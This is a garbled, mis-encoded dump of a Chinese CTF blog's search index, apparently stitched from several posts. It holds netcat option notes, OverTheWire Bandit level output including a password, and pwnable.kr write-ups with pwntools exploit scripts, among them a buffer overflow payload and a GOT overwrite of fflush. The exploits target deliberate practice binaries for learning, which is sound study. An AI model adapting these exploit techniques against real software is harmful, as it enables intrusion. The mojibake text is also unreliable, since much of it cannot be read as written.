-G&lt;æŒ‡å‘å™¨æ•°ç›®&gt;ï¼šè®¾ç½®æ¥æºè·¯ç”±æŒ‡å‘å™¨ï¼Œå…¶æ•°å€¼ä¸º4çš„å€æ•°; -hï¼šåœ¨çº¿å¸®åŠ©; -i&lt;å»¶è¿Ÿç§’æ•°&gt;ï¼šè®¾ç½®æ—¶é—´é—´éš”ï¼Œä»¥ä¾¿ä¼ é€ä¿¡æ¯åŠæ‰«æé€šä¿¡ç«¯å£; -lï¼šä½¿ç”¨ç›‘å¬æ¨¡å¼ï¼Œç›‘æ§ä¼ å…¥çš„èµ„æ–™; -nï¼šç›´æ¥ä½¿ç”¨ipåœ°å€ï¼Œè€Œä¸é€šè¿‡åŸŸåæœåŠ¡å™¨; -o&lt;è¾“å‡ºæ–‡ä»¶&gt;ï¼šæŒ‡å®šæ–‡ä»¶åç§°ï¼ŒæŠŠå¾€æ¥ä¼ è¾“çš„æ•°æ®ä»¥16è¿›åˆ¶å­—ç å€¾å€’æˆè¯¥æ–‡ä»¶ä¿å­˜; -p&lt;é€šä¿¡ç«¯å£&gt;ï¼šè®¾ç½®æœ¬åœ°ä¸»æœºä½¿ç”¨çš„é€šä¿¡ç«¯å£; -rï¼šæŒ‡å®šæºç«¯å£å’Œç›®çš„ç«¯å£éƒ½è¿›è¡Œéšæœºçš„é€‰æ‹©; -s&lt;æ¥æºä½å€&gt;ï¼šè®¾ç½®æœ¬åœ°ä¸»æœºé€å‡ºæ•°æ®åŒ…çš„IPåœ°å€; -uï¼šä½¿ç”¨UDPä¼ è¾“åè®®; -vï¼šæ˜¾ç¤ºæŒ‡ä»¤æ‰§è¡Œè¿‡ç¨‹; -w&lt;è¶…æ—¶ç§’æ•°&gt;ï¼šè®¾ç½®ç­‰å¾…è¿çº¿çš„æ—¶é—´; -zï¼šä½¿ç”¨0è¾“å…¥/è¾“å‡ºæ¨¡å¼ï¼Œåªåœ¨æ‰«æé€šä¿¡ç«¯å£æ—¶ä½¿ç”¨ã€‚ 1234bandit14@bandit:~$ nc localhost 300004wcYUJFw0k0XLShlDzztnTBHiqxU3b3eCorrect!BfMYroe26WYalil77FoDi9qh59eK5xNr Level_15â¡Level_16Level_16â¡Level_17Level_17â¡Level_18Level_18â¡Level_19Level_19â¡Level_20Level_20â¡Level_21Level_21â¡Level_22Level_22â¡Level_23Level_23â¡Level_24Level_24â¡Level_25Level_25â¡Level_26Level_26â¡Level_27Level_27â¡Level_28Level_28â¡Level_29Level_29â¡Level_30Level_30â¡Level_31Level_31â¡Level_32Level_32â¡Level_33","categories":[{"name":"linux","slug":"linux","permalink":"http://example.com/categories/linux/"}],"tags":[{"name":"linux","slug":"linux","permalink":"http://example.com/tags/linux/"},{"name":"CTF","slug":"CTF","permalink":"http://example.com/tags/CTF/"}]},{"title":"Webé¢˜è§£_natas","slug":"Web_1","date":"2021-04-20T01:04:24.027Z","updated":"2021-04-20T01:03:59.786Z","comments":true,"path":"2021/04/20/Web_1/","link":"","permalink":"http://example.com/2021/04/20/Web_1/","excerpt":"","text":"Webé¢˜è§£_natasEasy_webå…¥é—¨åˆ·é¢˜","categories":[{"name":"Web","slug":"Web","permalink":"http://example.com/categories/Web/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://example.com/tags/CTF/"},{"name":"Web","slug":"Web","permalink":"http://example.com/tags/Web/"}]},{"title":"Pwnable_gameé¢˜è§£_1","slug":"Pwn_1","date":"2021-04-19T16:59:27.486Z","updated":"2021-04-20T00:51:21.326Z","comments":true,"path":"2021/04/20/Pwn_1/","link":"","permalink":"http://example.com/2021/04/20/Pwn_1/","excerpt":"","text":"Pwnable_gameså¼€å§‹åˆ·é¢˜å•¦ï¼å†²å†²å†²ï¼æœ¬è´´è®°å½•ä¸»è¦è®°å½•çŸ¥è¯†ç‚¹å’Œexp fdTips: mainå‡½æ•°çš„ä¸‰ä¸ªå‚æ•° int argc intå‹å˜é‡ï¼Œè¡¨ç¤ºä¼ é€’ç»™mainå‡½æ•°çš„å‚æ•°æ•°é‡ã€‚ char *argv æŒ‡é’ˆæ•°ç»„ï¼Œæ¯ä¸ªæŒ‡é’ˆæŒ‡å‘å„ä¸ªå…·ä½“çš„å‚æ•°ã€‚ char*envp ç¯å¢ƒå˜é‡ï¼Œå¯ä»¥ä¸ºç¨‹åºè¿è¡Œè¿‡ç¨‹ä¸­éœ€è¦ä½¿ç”¨ç¯å¢ƒå˜é‡åšå‚è€ƒã€‚ Demo: 1$ ./hello //æ‰§è¡Œè¯¥æ–‡ä»¶ æ­¤æ—¶argc=1,è¡¨ç¤ºåªæœ‰ä¸€ä¸ªå‚æ•°è¾“å…¥ argvåªæœ‰ä¸€ä¸ªå…ƒç´ ,argv[0]æŒ‡å‘è¾“å…¥ç¨‹åºè·¯å¾„åŠåç§°: ./hello 1$ ./hello para_1 æ­¤æ—¶argc=2,æœ‰ä¸¤ä¸ªå‚æ•°ä¼ å…¥ argc[0]æŒ‡å‘è¾“å…¥ç¨‹åºè·¯å¾„åŠåç§° â€œ./helloâ€ argv[1]æŒ‡å‘para_1å­—ç¬¦ä¸² Linux æ–‡ä»¶IOéƒ¨åˆ†ç†è§£ æ‰€æœ‰çš„I/Oè®¾å¤‡éƒ½è¢«æ¨¡å‹åŒ–ä¸ºæ–‡ä»¶ï¼Œè€Œæ‰€æœ‰çš„è¾“å…¥å’Œè¾“å‡ºéƒ½è¢«å½“åšç›¸åº”æ–‡ä»¶çš„è¯»å’Œå†™æ¥æ‰§è¡Œã€‚è¿™ç§å°†è®¾å¤‡ä¼˜é›…æ˜ å°„ä¸ºæ–‡ä»¶çš„æ–¹å¼ï¼Œå…è®¸Linuxå†…æ ¸å¼•å‡ºä¸€ä¸ªç®€å•ã€ä½çº§çš„åº”ç”¨æ¥å£ï¼Œç§°ä¸ºUnix I/Oï¼Œè¿™ä½¿å¾—æ‰€æœ‰è¾“å…¥å’Œè¾“å‡ºéƒ½èƒ½ä»¥ä¸€ç§ç»Ÿä¸€ã€ä¸€è‡´çš„æ–¹å¼æ¥æ‰§è¡Œï¼š æ‰“å¼€æ–‡ä»¶ ï¼š åº”ç”¨ç¨‹åºé€šè¿‡å†…æ ¸æ‰“å¼€ç›¸åº”æ–‡ä»¶ï¼Œå†…æ ¸è¿”å›ä¸€ä¸ªå°çš„éè´Ÿæ•´æ•°ï¼Œå«åšæè¿°ç¬¦ï¼Œå®ƒåœ¨åç»­å¯¹æ­¤æ–‡ä»¶çš„æ‰€æœ‰æ“ä½œä¸­æ ‡è¯†è¿™ä¸ªæ–‡ä»¶ã€‚å†…æ ¸è®°å½•æœ‰å…³æ‰“å¼€æ–‡ä»¶çš„æ‰€æœ‰ä¿¡æ¯ã€‚åº”ç”¨ç¨‹åºåªéœ€è®°ä½è¿™ä¸ªæè¿°ç¬¦ã€‚ æ–‡ä»¶æè¿°ç¬¦fdï¼š æ–‡ä»¶æè¿°ç¬¦åœ¨å½¢å¼ä¸Šæ˜¯ä¸€ä¸ªéè´Ÿæ•´æ•°ã€‚å®é™…ä¸Šï¼Œå®ƒæ˜¯ä¸€ä¸ªç´¢å¼•å€¼ï¼ŒæŒ‡å‘å†…æ ¸ä¸ºæ¯ä¸€ä¸ªè¿›ç¨‹æ‰€ç»´æŠ¤çš„è¯¥è¿›ç¨‹æ‰“å¼€æ–‡ä»¶çš„è®°å½•è¡¨ã€‚å½“ç¨‹åºæ‰“å¼€ä¸€ä¸ªç°æœ‰æ–‡ä»¶æˆ–è€…åˆ›å»ºä¸€ä¸ªæ–°æ–‡ä»¶æ—¶ï¼Œå†…æ ¸å‘è¿›ç¨‹è¿”å›ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦ã€‚ Linux shellåˆ›å»ºçš„æ¯ä¸ªè¿›ç¨‹å¼€å§‹æ—¶éƒ½æœ‰ä¸‰ä¸ªæ‰“å¼€çš„æ–‡ä»¶ï¼š 12345stdin æ ‡å‡†è¾“å…¥çš„æ–‡ä»¶æ ‡è¯†ç¬¦ä¸º0 stdout æ ‡å‡†è¾“å‡ºçš„æ–‡ä»¶æ ‡è¯†ç¬¦ä¸º1stderr æ ‡å‡†é”™è¯¯è¾“å‡ºçš„æ–‡ä»¶æ ‡è¯†ç¬¦ä¸º2 Exp: 1234567891011#coding=utf-8from pwn import *payload=str(0x1234)shell=ssh(host=&#x27;pwnable.kr&#x27;,user=&#x27;fd&#x27;,password=&#x27;guest&#x27;,port=2222)#shell.download_file(&#x27;fd.c&#x27;)sh = shell.run(&#x27;./fd&#x27;+&#x27; &#x27;+payload)payload=&quot;LETMEWIN&quot;sh.sendline(payload)sh.interactive() collisionTips: è·Ÿå“ˆå¸Œç›¸å…³ä¸å¤§ï¼ˆÃ— å¯èƒ½æ˜¯æˆ‘æ²¡æœ‰getåˆ°å‡ºé¢˜äººçš„æ„æ€ æ€è·¯å¾ˆç®€å•ï¼Œç”¨hashcodeçš„å€¼é™¤ä»¥5ï¼Œå†ä¾æ¬¡åŠ èµ·æ¥å°±å¥½äº†ã€‚0x21DD09ECçš„åè¿›åˆ¶è¡¨ç¤ºæ˜¯568134124ï¼Œå®ƒå¹¶ä¸èƒ½è¢«5æ•´é™¤ï¼Œæ‰€ä»¥æˆ‘ä»¬ç”¨ä¸€ä¸ªå°æŠ€å·§ï¼Œå…ˆåŠ 1ï¼Œå†é™¤ä»¥5ï¼Œæœ€åå°†å…¶ä¸­ä¸€ä¸ªæ•°å€¼å†å‡1å³å¯ã€‚ å…·ä½“è®¡ç®—æ–¹æ³•ä¸ºï¼š 12(568134124 + 1) / 5 = 113626825 = 0x6C5CEC90x21DD09EC = 0x6C5CEC9 + 0x6C5CEC9 + 0x6C5CEC9 + 0x6C5CEC9 + 0x6C5CEC8 é‚£ä¹ˆargv[1]çš„å­—ç¬¦ä¸²ï¼Œå°±åº”è¯¥æ˜¯ä¸€ä¸ªç”±ç›¸åº”åå…­è¿›åˆ¶æ•°å€¼ç»„æˆçš„å­—ç¬¦ä¸²ï¼Œè¡¨ç¤ºå¦‚ä¸‹ï¼š 1\\xc9\\xce\\xc5\\x06\\xc9\\xce\\xc5\\x06\\xc9\\xce\\xc5\\x06\\xc9\\xce\\xc5\\x06\\xc8\\xce\\xc5\\x06 è¿™é‡Œé‡‡ç”¨å°ç«¯å­˜å‚¨æ–¹å¼ã€‚ å°ç«¯å­˜å‚¨ï¼šé«˜å­—èŠ‚ä¿å­˜åœ¨å†…å­˜é«˜åœ°å€ï¼Œä½å­—èŠ‚ä¿å­˜åœ¨å†…å­˜ä½åœ°å€ä¸­ è¿™ä¸ªè§£é‡Šä¾æ—§ååˆ†ç¬¼ç»Ÿï¼Œä¸ºä»€ä¹ˆintå‹æ•°æ®ä»¥å°ç«¯å­˜å‚¨å°±è¦æ¯ä¸ªintå‹æ•°æ®é€†åºè¾“å…¥ ä¸‹é¢ä¸¤å¼ å›¾è¯´æ˜é—®é¢˜ï¼šï¼ˆÃ—å…¶å®è¿˜å¹¶ä¸èƒ½è¯´æ˜é—®é¢˜ ä½†æ˜¯æˆ‘ä»¬å¹¶ä¸çŸ¥é“è¾“å…¥çš„å‘½ä»¤è¡Œå‚æ•°åœ¨å†…å­˜å­˜å‚¨çš„å¢é•¿æ–¹å‘ğŸ˜€ å„ç§Googleå‡æ— æœã€‚ã€‚æ— å¥ˆä¸‹æ‰‹åŠ¨æµ‹è¯•ä¸€ä¸‹ã€‚ Test Code: 12345678910 #include&lt;stdio.h&gt; int main(int argc,char* argv[],char* env[]) &#123;for(int i=0;i&lt;=2;i++) printf(&quot;argv[%d]:%p\\n&quot;,i,argv[i]); int i=0; printf(&quot;stack:%p\\n&quot;,&amp;i); printf(&quot;env:%p\\n&quot;,env[i]); return 0; &#125; å®è·µå‡ºçœŸçŸ¥: è¾“å…¥çš„argv[1]å­˜å‚¨åœ¨æ ˆä¸Šå’Œå†…æ ¸ç©ºé—´ä¹‹é—´ï¼Œå¹¶ä¸”ç”±ä½åœ°å€å‘é«˜åœ°å€å¢é•¿ã€‚ é‚£ä¹ˆå°±å¾ˆå®¹æ˜“æ˜ç™½ä¸ºä»€ä¹ˆé€†åºè¾“å…¥intå››ä¸ªå­—èŠ‚äº†ã€‚ ä»¥ä¸º0x6C5CEC9å’Œ0x6C5CEC8ä¸ºä¾‹ æˆ‘ä»¬ä¼ å…¥å‘½ä»¤è¡Œå‚æ•°argv[1]å¯¹åº”çš„å­—èŠ‚åºåˆ—ä¸º \\xc9\\xce\\xc5\\x06\\x12\\x34\\x56\\x78å®é™…å­˜å‚¨æ—¶å¦‚ä¸‹æ–¹å¼å­˜å‚¨å¦‚ä¸‹ï¼š é«˜åœ°å€8 78é«˜åœ°å€7 56é«˜åœ°å€6 34é«˜åœ°å€5 12é«˜åœ°å€4 06é«˜åœ°å€3 c5é«˜åœ°å€2 ceé«˜åœ°å€1 c9 intå‹å·æŒ‡é’ˆipæŒ‡å‘é«˜åœ°å€1 é‚£ä¹ˆç”±äºintå‹å·ä¸ºå°ç«¯å­˜å‚¨ï¼Œå››ä¸ªå­—èŠ‚ä¾æ¬¡è¯»å– ip[i]=0x06C5CEC9 ip[2]=0x78563412 ç½‘ä¸Šå¤§éƒ¨åˆ†è§£æåªæ˜¯ç®€å•è¯´æ˜intæ•°æ®å°ç«¯å­˜å‚¨ï¼Œä½†æ˜¯å•å•çŸ¥é“è¿™ä¸ªæ˜¯ä¸è¶³ä»¥å¾—å‡ºé€†åºè¾“å…¥çš„ç»“è®ºï¼Œå¿…é¡»çŸ¥é“å‘½ä»¤è¡Œå‚æ•°å­˜å‚¨ç»“æ„ã€‚ ä»¥ä¸Šå†…å®¹åŸåˆ›ã€‚è½¬è½½æ³¨æ˜å‡ºå¤„ã€‚ PSï¼šéƒ¨åˆ†å­—èŠ‚æ²¡æœ‰å¯¹åº”ASCIIç ï¼Œæˆ‘ä»¬éœ€è¦ç›´æ¥å‘argv[1]ä¸­å†™å…¥å­—èŠ‚ï¼Œå¯ä»¥ç”¨pythonå®ç° Demo: 1`python -c print &#x27;\\xAB\\xCD&#x27;` Exp: 12345678#coding=utf-8from pwn import *payload=p32(0x6c5cec9)*4+p32(0x6c5cec8)shell=ssh(host=&#x27;pwnable.kr&#x27;,user=&#x27;col&#x27;,password=&#x27;guest&#x27;,port=2222)sh = shell.run(&#x27;./col&#x27;+&#x27; &#x27;+payload)sh.interactive() bofAnalyse: getç®€å•çš„æº¢å‡º IDAé™æ€æŸ¥çœ‹arg[1]å’Œæ•°ç»„keyå¯¹åº”çš„VAåœ°å€ï¼Œè®¡ç®—å‡ºåç§»ä¸º0x52 Exp: 1234567#coding=utf-8from pwn import *io=remote(&quot;pwnable.kr&quot;,9000)payload=&#x27;a&#x27;*(0x2c+0x8)+p32(0xcafebabe)io.sendline(payload)io.interactive() flagAnalyse: IDAé™æ€åˆ†æå‘ç°é‡Œé¢å†…å®¹å°‘å¾—å¯æ€œ..å¾ˆæ˜æ˜¾æ˜¯åŠ å£³äº† è¿™é‡Œéœ€è¦ç”¨åˆ°stringså‘½ä»¤ï¼Œä¸€ä¸ªæŠ€å·§å¯ä»¥è·å¾—å…³é”®çš„ä¿¡æ¯ï¼š 1strings -20 flag æ˜¾ç¤ºflagæ–‡ä»¶ä¸­è‡³å°‘åŒ…å«20ä¸ªå­—ç¬¦çš„å­—ç¬¦ä¸²ï¼Œå®šä½å…³é”®ä¿¡æ¯ï¼š 1Info: This file is packed with the UPX executable packer http:&#x2F;&#x2F;upx.sf.net Googleåç®€å•äº†è§£äº†ä¸€ä¸‹upx ï¼Œæ˜¯ä¸ªå‹ç¼©å£³ upx -d è§£å‹ä¸€ä¸‹å³å¯ ç„¶åå­—ç¬¦æœç´¢å…³é”®è¯å­— :) #æ³¨æ„æ­¤å¤„éœ€è¦è½¬ä¹‰å­—ç¬¦ 1strings flag |grep \\:\\) passcodesouce code: 1234567891011121314151617181920212223242526272829303132333435363738394041424344#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;void login()&#123; int passcode1; int passcode2; printf(&quot;enter passcode1 : &quot;); scanf(&quot;%d&quot;, passcode1); fflush(stdin); // ha! mommy told me that 32bit is vulnerable to bruteforcing :) printf(&quot;enter passcode2 : &quot;); scanf(&quot;%d&quot;, passcode2); printf(&quot;checking...\\n&quot;); if(passcode1==338150 &amp;&amp; passcode2==13371337)&#123;//è¿™ä¸ªæ¡ä»¶ä¸€æ—¦æˆç«‹å°±å¯ä»¥pwn printf(&quot;Login OK!\\n&quot;); system(&quot;/bin/cat flag&quot;); &#125; else&#123; printf(&quot;Login Failed!\\n&quot;); exit(0); &#125;&#125;void welcome()&#123; char name[100]; printf(&quot;enter you name : &quot;); scanf(&quot;%100s&quot;, name); printf(&quot;Welcome %s!\\n&quot;, name);&#125;int main()&#123; printf(&quot;Toddler&#x27;s Secure Login System 1.0 beta.\\n&quot;); welcome(); login(); // something after login... printf(&quot;Now I can safely trust you that you have credential :)\\n&quot;); return 0;&#125; key points: scanfå‡½æ•°: scanf(&quot;%d&quot;, passcode1); ç¼ºå°‘ä¸€ä¸ª&amp;è¿™æ—¶å‡½æ•°æ‰§è¡Œæ—¶ï¼Œä¼šå°†passcode1ä½œä¸ºåœ°å€è¿›è¡Œå†™å…¥æ“ä½œï¼ŒåŒç†å¯¹åº”passcode2ä¸€æ ·ã€‚ä¸€æ—¦è¿™ä¸¤ä¸ªä¸å¯æ§çš„åœ°å€æ˜¯ä¸å¯å†™æˆ–è®¿é—®çš„ï¼Œé‚£ä¹ˆç¨‹åºå°±crashäº†ã€‚ é‚£ä¹ˆå¯¹passcode1å’Œ2åœ°å€çš„æ„é€ ï¼Œç„¶ååˆ©ç”¨scanfå‡½æ•°åœ¨è¯¥åœ°å€è¿›è¡Œå†™å…¥æ•°æ®ä¼šæ˜¯å…³é”®ã€‚ Analyseï¼š å‡½æ•°æµç¨‹åˆ†æ welcome:å¯ä»¥åœ¨nameæ•°ç»„ä¸­å†™å…¥é•¿åº¦ä½100å­—èŠ‚çš„å­—ç¬¦ æ¥ä¸‹æ¥æ— ç¼æ‰§è¡Œ loginï¼š å¯¹passcode1åœ°å€ä¸Šè¿›è¡Œå†™å…¥æ•°æ® â¡ è°ƒç”¨fflush(stdin); â¡ è¾“å…¥passcode2 â¡checkä¸ºçœŸåè¾“å‡ºflag ç”±äºwelcome()å’Œlogin()è¿™ä¸¤ä¸ªå‡½æ•°ä¹‹é—´æ‰§è¡ŒæœŸé—´æ²¡æœ‰å…¶ä»–æ“ä½œï¼Œå¯ä»¥åˆ†æå¾—å‡ºå‰åè¿›å…¥è¿™ä¸¤ä¸ªæ ˆå¸§æ—¶ï¼Œä»–ä»¬çš„EBPæ˜¯ä¸€æ ·çš„ï¼Œè‡ªç„¶å¯ä»¥æƒ³åˆ°æˆ‘ä»¬å¯ä»¥é¢†ç”¨nameæ•°ç»„å¯¹passcode1å’Œpasscode2è¿›è¡Œè¦†ç›–ã€‚ IDAé™æ€åˆ†æï¼š nameæ•°ç»„æ•°ç»„çš„åœ°å€ä¸ºï¼šEBP-70H passcode1åœ°å€: EBP-10H passcode2åœ°å€: EBP-0cH welcomeï¼ˆï¼‰å’Œloginï¼ˆï¼‰è¿™ä¸¤ä¸ªå‡½æ•°æ ˆå¸§çš„EBPä¸€æ ·åªæ˜¯æˆ‘ä»¬çš„çŒœæµ‹ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨gdbåŠ¨æ€è°ƒè¯•éªŒè¯æŸ¥çœ‹æ˜¯å¦ç¡®å®ç›¸åŒã€‚ ä¸‹è½½ELFæ–‡ä»¶ï¼š 1234#coding=utf-8from pwn import *shell=ssh(host=&#x27;pwnable.kr&#x27;,user=&#x27;passcode&#x27;,password=&#x27;guest&#x27;,port=2222)shell.download_file(&quot;./passcode&quot;) ä¿®æ”¹æƒé™ 1chmod 777 passcode æŸ¥çœ‹å†…å­˜ä¿æŠ¤ä¿¡æ¯ï¼š 1checksec passcode æ­¤å¤„çš„RELROä¿¡æ¯ä¸ºå…³é”®ç‚¹ï¼Œå…³äºchecksec æŸ¥çœ‹å†…å­˜ä¿æŠ¤ä¿¡æ¯å‚é˜…è¿™ç¯‡ï¼š linuxå†…å­˜ä¿æŠ¤ä¿¡æ¯ gdbåŠ¨æ€è°ƒè¯•ï¼š æŸ¥çœ‹éªŒè¯ï¼šç¡®å®ä¸¤ä¸ªå‡½æ•°æ ˆå¸§çš„EBPç›¸åŒï¼Œé‚£ä¹ˆè‡ªç„¶æƒ³åˆ°å¯ä»¥åˆ©ç”¨nameæ•°ç»„å¯¹passcode1å’Œ2è¿›è¡Œè¦†ç›–ï¼Œä½†æ˜¯æ³¨æ„åˆ°æ•°ç»„nameå¤§å°æ˜¯100å­—èŠ‚ï¼Œnameé¦–åœ°å€åˆ°passcode1é¦–åœ°å€è·ç¦»ä¸º96ï¼Œæˆ‘ä»¬ç»„å¤šèƒ½åˆ©ç”¨nameæ•°ç»„çš„æœ€åå››ä¸ªå­—èŠ‚è¦†ç›–passcode1ï¼Œæ— æ³•è¦†ç›–åˆ°passcode2 æ³¨æ„åˆ°è¾“å…¥passcode1åï¼Œç«‹å³æ‰§è¡Œäº† fflush(stdin) ã€ç”¨äºæ›´æ–°ç¼“å†²åŒºã€‘å‡½æ•°ï¼Œè°ƒç”¨è¿™ä¸ªå‡½æ•°çš„æ—¶å€™ä¼šåˆ©ç”¨linuxçš„åŠ¨æ€å»¶è¿ŸåŠ è½½ã€‚ æ­¤å¤„éœ€è¦æ¶è¡¥ä¸€ä¸‹GOTå’ŒPLTè¡¨çš„å…³ç³»ä»¥åŠlinuxåŠ¨æ€å»¶è¿ŸåŠ è½½çš„ä¸€äº›åªæ˜¯ï¼š å‚è€ƒè¿™ç¯‡éå¸¸è¯¦ç»† å‚é˜…å®Œæ¯•åå°±å¯ä»¥è¿›è¡Œexp Hijack GOTï¼š ä¿®æ”¹æŸä¸ªè¢«è°ƒç”¨å‡½æ•°çš„åœ°å€ï¼Œè®©å…¶æŒ‡å‘å¦ä¸€ä¸ªå‡½æ•° è¿™é‡Œæˆ‘ä»¬ä¿®æ”¹è°ƒç”¨fflushçš„åœ°å€ï¼Œæ”¹ä¸ºcat flagæŒ‡ä»¤çš„åœ°å€ï¼Œç„¶åæˆåŠŸæ‰§è¡Œcat flagæŒ‡ä»¤å¾—åˆ°flagã€‚ æœ€åè¦åšçš„å°±æ˜¯æ‰¾åˆ°è°ƒç”¨fflushçš„åœ°å€å’Œcat flagçš„åœ°å€ï¼Œç„¶åç”¨nameæ•°ç»„å¯¹passcode1è¦†ç›–ä¸ºfflushçš„GOTè¡¨é¡¹åœ°å€ï¼Œç„¶åç”¨scanfå‡½æ•°å¯¹GOTè¡¨è±¡è¦†å†™ä¸ºè¾“å‡ºflagçš„æŒ‡ä»¤å³å¯ã€‚ æ‰¾åˆ°fflushçš„GOTè¡¨é¡¹åœ°å€: 0x0804a004 æ‰¾åˆ°cat flag æŒ‡ä»¤åœ°å€ä¸ºï¼š0x080485E3 Expï¼š 1234567891011#coding=utf-8from pwn import *shell=ssh(host=&#x27;pwnable.kr&#x27;,user=&#x27;passcode&#x27;,password=&#x27;guest&#x27;,port=2222)sysh_addr=0x080485E3fflush_got=0x0804a004payload=&quot;a&quot;*(100-4)+p32(fflush_got)sh=shell.run(&#x27;./passcode&#x27;)sh.sendlineafter(&quot;enter you name :&quot;,payload)payload=str(sysh_addr)sh.sendlineafter(&quot;enter passcode1 :&quot;,payload)sh.interactive() randomä¸€ä¸ªCè¯­è¨€çš„çŸ¥è¯†ç‚¹ï¼šå¦‚æœç”¨æˆ·åœ¨rand()ä¹‹å‰æ²¡æœ‰è°ƒç”¨è¿‡sand(),é‚£ä¹ˆç³»ç»Ÿé»˜è®¤å°†1ä½œä¸ºä¼ªéšæœºæ•°çš„åˆå§‹å€¼ï¼Œå¦‚æœç»™å®šäº†ä¸€ä¸ªå€¼ï¼Œé‚£ä¹ˆæ¯æ¬¡rand()äº§ç”Ÿçš„éšæœºæ•°åºåˆ—éƒ½æ˜¯ä¸€æ ·çš„ã€‚ EXP 12345678#coding=utf-8from pwn import *shell=ssh(host=&#x27;pwnable.kr&#x27;,user=&#x27;random&#x27;,password=&#x27;guest&#x27;,port=2222)payload=str(3039230856)sh=shell.run(&#x27;./random&#x27;)sh.sendline(payload)sh.interactive() inputä¸»è¦è€ƒå¯Ÿlinuxçš„ä¸€äº›åŸºæœ¬å‚æ•°ä¼ é€’ï¼Œè¿™é‡Œå°±å½“åšå­¦ä¹ pythonçš„ä¸€äº›æ¨¡å—ã€‚ã€‚ subprocessæ¨¡å— Demo: 1subprocess.run(args, *, stdin=None, input=None, stdout=None, stderr=None, capture_output=False, shell=False, cwd=None, timeout=None, check=False, encoding=None, errors=None, text=None, env=None, universal_newlines=None) argsï¼šè¡¨ç¤ºè¦æ‰§è¡Œçš„å‘½ä»¤ã€‚å¿…é¡»æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå­—ç¬¦ä¸²å‚æ•°åˆ—è¡¨ã€‚ stdinã€stdout å’Œ stderrï¼šå­è¿›ç¨‹çš„æ ‡å‡†è¾“å…¥ã€è¾“å‡ºå’Œé”™è¯¯ã€‚å…¶å€¼å¯ä»¥æ˜¯ subprocess.PIPEã€subprocess.DEVNULLã€ä¸€ä¸ªå·²ç»å­˜åœ¨çš„æ–‡ä»¶æè¿°ç¬¦ã€å·²ç»æ‰“å¼€çš„æ–‡ä»¶å¯¹è±¡æˆ–è€… Noneã€‚subprocess.PIPE è¡¨ç¤ºä¸ºå­è¿›ç¨‹åˆ›å»ºæ–°çš„ç®¡é“ã€‚subprocess.DEVNULL è¡¨ç¤ºä½¿ç”¨ os.devnullã€‚é»˜è®¤ä½¿ç”¨çš„æ˜¯ Noneï¼Œè¡¨ç¤ºä»€ä¹ˆéƒ½ä¸åšã€‚å¦å¤–ï¼Œstderr å¯ä»¥åˆå¹¶åˆ° stdout é‡Œä¸€èµ·è¾“å‡ºã€‚ timeoutï¼šè®¾ç½®å‘½ä»¤è¶…æ—¶æ—¶é—´ã€‚å¦‚æœå‘½ä»¤æ‰§è¡Œæ—¶é—´è¶…æ—¶ï¼Œå­è¿›ç¨‹å°†è¢«æ€æ­»ï¼Œå¹¶å¼¹å‡º TimeoutExpired å¼‚å¸¸ã€‚ checkï¼šå¦‚æœè¯¥å‚æ•°è®¾ç½®ä¸º Trueï¼Œå¹¶ä¸”è¿›ç¨‹é€€å‡ºçŠ¶æ€ç ä¸æ˜¯ 0ï¼Œåˆ™å¼¹ å‡º CalledProcessError å¼‚å¸¸ã€‚ encoding: å¦‚æœæŒ‡å®šäº†è¯¥å‚æ•°ï¼Œåˆ™ stdinã€stdout å’Œ stderr å¯ä»¥æ¥æ”¶å­—ç¬¦ä¸²æ•°æ®ï¼Œå¹¶ä»¥è¯¥ç¼–ç æ–¹å¼ç¼–ç ã€‚å¦åˆ™åªæ¥æ”¶ bytes ç±»å‹çš„æ•°æ®ã€‚ shellï¼šå¦‚æœè¯¥å‚æ•°ä¸º Trueï¼Œå°†é€šè¿‡æ“ä½œç³»ç»Ÿçš„ shell æ‰§è¡ŒæŒ‡å®šçš„å‘½ä»¤ã€‚ osæ¨¡å— è¯¥æ¨¡å—æä¾›äº†ä¸€äº›æ–¹ä¾¿ä½¿ç”¨æ“ä½œç³»ç»Ÿç›¸å…³åŠŸèƒ½çš„å‡½æ•°ã€‚ fdopen()å‡½æ•°ï¼šåˆ›å»ºæ–‡ä»¶å¯¹è±¡ os.fdopen(fd, **args,**kwargs):è¿”å›æ‰“å¼€æ–‡ä»¶æè¿°ç¬¦ fd å¯¹åº”æ–‡ä»¶çš„å¯¹è±¡ã€‚ç±»ä¼¼å†…å»º open() å‡½æ•°ï¼ŒäºŒè€…æ¥å—åŒæ ·çš„å‚æ•°ã€‚ä¸åŒä¹‹å¤„åœ¨äº fdopen() ç¬¬ä¸€ä¸ªå‚æ•°åº”è¯¥ä¸ºæ•´æ•°ã€‚ open()å‡½æ•°ï¼š æ‰“å¼€æ–‡ä»¶å¯¹è±¡ file æ˜¯ä¸€ä¸ª path-like objectï¼Œè¡¨ç¤ºå°†è¦æ‰“å¼€çš„æ–‡ä»¶çš„è·¯å¾„ï¼ˆç»å¯¹è·¯å¾„æˆ–è€…å½“å‰å·¥ä½œç›®å½•çš„ç›¸å¯¹è·¯å¾„ï¼‰ï¼Œä¹Ÿå¯ä»¥æ˜¯è¦è¢«å°è£…çš„æ•´æ•°ç±»å‹æ–‡ä»¶æè¿°ç¬¦ã€‚ï¼ˆå¦‚æœæ˜¯æ–‡ä»¶æè¿°ç¬¦ï¼Œå®ƒä¼šéšç€è¿”å›çš„ I/O å¯¹è±¡å…³é—­è€Œå…³é—­ï¼Œé™¤é closefd è¢«è®¾ä¸º False ã€‚ï¼‰ open(file, mode=â€™râ€™, buffering=-1, encoding=None, errors=None, newline=None, closefd=True, opener=None) mode æ˜¯ä¸€ä¸ªå¯é€‰å­—ç¬¦ä¸²ï¼Œç”¨äºæŒ‡å®šæ‰“å¼€æ–‡ä»¶çš„æ¨¡å¼ã€‚é»˜è®¤å€¼æ˜¯ &#39;r&#39; ï¼Œè¿™æ„å‘³ç€å®ƒä»¥æ–‡æœ¬æ¨¡å¼æ‰“å¼€å¹¶è¯»å–ã€‚å…¶ä»–å¸¸è§æ¨¡å¼æœ‰ï¼šå†™å…¥ &#39;w&#39; ï¼ˆæˆªæ–­å·²ç»å­˜åœ¨çš„æ–‡ä»¶ï¼‰ï¼›æ’å®ƒæ€§åˆ›å»º &#39;x&#39; ï¼›è¿½åŠ å†™ &#39;a&#39; ï¼ˆåœ¨ ä¸€äº› Unix 